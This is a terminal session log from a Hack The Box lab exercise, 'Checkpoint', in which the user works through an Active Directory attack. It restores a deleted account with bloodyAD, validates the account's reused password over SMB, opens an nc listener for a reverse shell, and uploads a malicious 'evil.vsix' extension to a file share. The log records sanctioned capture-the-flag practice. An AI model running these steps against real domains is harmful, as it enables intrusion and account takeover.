  File "/usr/share/bloodyad/bloodyAD/network/config.py", line 135, in __init__
    cnf = Config(
        domain=args.domain,
    ...<11 lines>...
        debug=args.secure
    )
  File "<string>", line 25, in __init__
  File "/usr/share/bloodyad/bloodyAD/network/config.py", line 93, in __post_init__
    raise socket.gaierror("host in --host couldn't be resolved, provide one in --dc-ip")
socket.gaierror: host in --host couldn't be resolved, provide one in --dc-ip

 ✘  Thu 18 Jun - 11:19  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  

 ✘  Thu 18 Jun - 11:19  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
Traceback (most recent call last):
  File "/usr/share/bloodyad/bloodyAD.py", line 5, in <module>
    main.main()
    ~~~~~~~~~^^
  File "/usr/share/bloodyad/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 204, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 127, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/base_events.py", line 719, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/usr/share/bloodyad/bloodyAD/main.py", line 232, in amain
    conn = ConnectionHandler(args=args)
  File "/usr/share/bloodyad/bloodyAD/network/config.py", line 135, in __init__
    cnf = Config(
        domain=args.domain,
    ...<11 lines>...
        debug=args.secure
    )
  File "<string>", line 25, in __init__
  File "/usr/share/bloodyad/bloodyAD/network/config.py", line 93, in __post_init__
    raise socket.gaierror("host in --host couldn't be resolved, provide one in --dc-ip")
socket.gaierror: host in --host couldn't be resolved, provide one in --dc-ip

 ✘  Thu 18 Jun - 11:21  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  bloodyad --dc-ip $ip --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

 Thu 18 Jun - 11:21  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  netexec smb $ip -u 'Mark.Davies' -p 'Checkpoint2024!' 
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [+] checkpoint.htb\Mark.Davies:Checkpoint2024! 

 Thu 18 Jun - 11:25  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  smbclient -L \\\\$ip\\ 
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\user]:

 ✘  Thu 18 Jun - 11:26  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  smbclient -L \\\\$ip\\ -u Mark.Davies

Invalid option -u: unknown option

Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet] [-B|--browse]
        [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE] [--leak-report]
        [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL] [-n|--netbiosname=NETBIOSNAME]
        [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]] [-N|--no-pass] [--password=STRING] [--pw-nt-hash]
        [-A|--authentication-file=FILE] [-P|--machine-pass] [--simple-bind-dn=DN] [--use-kerberos=desired|required|off] [--use-krb5-ccache=CCACHE]
        [--use-winbind-ccache] [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version] [OPTIONS] service <password>

 ✘  Thu 18 Jun - 11:26  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  smbclient -L \\\\$ip\\ -U Mark.Davies -P Checkpoint2024!
Can't load /etc/samba/smb.conf - run testparm to debug it
Failed to open /var/lib/samba/private/secrets.tdb
_samba_cmd_set_machine_account_s3: failed to open secrets.tdb to obtain our trust credentials for WORKGROUP
Failed to set machine account: NT_STATUS_INTERNAL_ERROR

 ✘  Thu 18 Jun - 11:27  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  mkdir extension                                         

 Thu 18 Jun - 11:30  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  cd extension         

 Thu 18 Jun - 11:30  ~/Documents/CTFs/HTB/Checkpoint/extension   origin ☊ main 2☀ 
 @user  ls

 Thu 18 Jun - 11:30  ~/Documents/CTFs/HTB/Checkpoint/extension   origin ☊ main 2☀ 
 @user  vim package.json

 Thu 18 Jun - 11:30  ~/Documents/CTFs/HTB/Checkpoint/extension   origin ☊ main 2☀ 
 @user  vim extension.js

 Thu 18 Jun - 11:36  ~/Documents/CTFs/HTB/Checkpoint/extension   origin ☊ main 2☀ 
 @user  nc -lvnp 9001
Listening on 0.0.0.0 9001
^C

 ✘  Thu 18 Jun - 11:40  ~/Documents/CTFs/HTB/Checkpoint/extension   origin ☊ main 2☀ 
 @user  cd ..                                                                                               

 Thu 18 Jun - 11:40  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  smbclient //$ip/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"
Can't load /etc/samba/smb.conf - run testparm to debug it
putting file evil.vsix as \evil.vsix (0.8 kB/s) (average 0.8 kB/s)

 Thu 18 Jun - 11:41  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  

```

